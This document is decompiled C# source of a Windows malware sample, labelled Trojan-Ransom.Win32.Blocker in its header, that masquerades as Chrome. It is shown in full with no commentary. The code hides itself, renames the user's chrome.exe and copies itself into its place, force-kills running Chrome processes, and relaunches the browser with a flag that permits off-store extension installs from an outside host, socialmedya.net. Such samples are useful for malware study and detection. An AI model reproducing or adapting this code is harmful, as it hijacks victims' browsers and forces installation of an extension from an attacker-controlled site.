// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.Form1
// Assembly: chrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BE15E066-1F19-4A11-BC91-15A529F83FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.axtc-56bb15568d1ce2aa207fe549aabae4f8b7415ffd7786a1a87172166eab2437db.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using WindowsApplication1.My;

namespace WindowsApplication1
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    private string AppId;
    private string chrome;
    private string username;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.AppId = "hhommgjjeekpmpcbdmfnhpchijdkgaei";
      this.chrome = "";
      this.username = MyProject.User.Name.ToString().Split('\\')[1];
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    private void Degistir()
    {
      if (MyProject.Computer.FileSystem.FileExists("C:\\Users\\" + this.username + "\\AppData\\Local\\Google\\Chrome\\Application\\new_chrome.exe"))
        return;
      MyProject.Computer.FileSystem.RenameFile(this.chrome, "new_chrome.exe");
      MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, this.chrome);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.ShowInTaskbar = false;
      this.TopMost = true;
      if (MyProject.Computer.FileSystem.FileExists("C:\\Users\\" + this.username + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe"))
      {
        this.chrome = "C:\\Users\\" + this.username + "\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe";
        this.Degistir();
      }
      else if (MyProject.Computer.FileSystem.FileExists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"))
      {
        this.chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
        this.Degistir();
      }
      else if (MyProject.Computer.FileSystem.FileExists("C:\\Documents and Settings\\" + this.username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe"))
      {
        this.chrome = "C:\\Documents and Settings\\" + this.username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe";
        this.Degistir();
      }
      else if (MyProject.Computer.FileSystem.FileExists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
      {
        this.chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
        this.Degistir();
      }
      if (MyProject.Computer.FileSystem.FileExists("C:\\Users\\" + this.username + "\\AppData\\Local\\Google\\Chrome\\Application\\new_chrome.exe"))
        this.chrome = "C:\\Users\\" + this.username + "\\AppData\\Local\\Google\\Chrome\\Application\\new_chrome.exe";
      else if (MyProject.Computer.FileSystem.FileExists("C:\\Program Files (x86)\\Google\\Chrome\\Application\\new_chrome.exe"))
        this.chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\new_chrome.exe";
      else if (MyProject.Computer.FileSystem.FileExists("C:\\Documents and Settings\\" + this.username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\new_chrome.exe"))
        this.chrome = "C:\\Documents and Settings\\" + this.username + "\\Local Settings\\Application Data\\Google\\Chrome\\Application\\new_chrome.exe";
      else if (MyProject.Computer.FileSystem.FileExists("C:\\Program Files\\Google\\Chrome\\Application\\new_chrome.exe"))
        this.chrome = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\new_chrome.exe";
      if (Operators.CompareString(this.chrome, "", false) != 0)
      {
        if (!MyProject.Computer.FileSystem.DirectoryExists("C:\\Users\\" + this.username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\" + this.AppId) & !MyProject.Computer.FileSystem.DirectoryExists("C:\\Documents and Settings\\" + this.username + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Extensions\\" + this.AppId))
        {
          if (Process.GetProcessesByName("chrome").Length > 1)
          {
            Interaction.Shell("taskkill /f /im chrome.exe");
            Thread.Sleep(1000);
          }
          Interaction.Shell(this.chrome + " --enable-easy-off-store-extension-install http://socialmedya.net/index.php?extension=true");
        }
        else
          Interaction.Shell(this.chrome);
      }
      ProjectData.EndApp();
    }
  }
}
